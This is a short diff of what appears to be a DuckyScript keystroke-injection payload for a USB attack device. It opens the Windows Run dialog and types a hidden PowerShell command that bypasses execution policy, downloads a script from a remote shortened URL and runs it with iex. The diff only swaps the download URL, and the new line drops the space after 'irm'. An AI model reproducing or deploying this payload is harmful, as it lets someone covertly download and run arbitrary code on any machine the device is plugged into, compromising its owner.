@@ -13,7 +13,7 @@ REM open powershell
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -W H -C irm https://bw0.cc/yhv | iex
+STRING powershell -NoP -Ep Bypass -W H -C irmhttps://is.gd/bwtoolset | iex
 ENTER
 
 
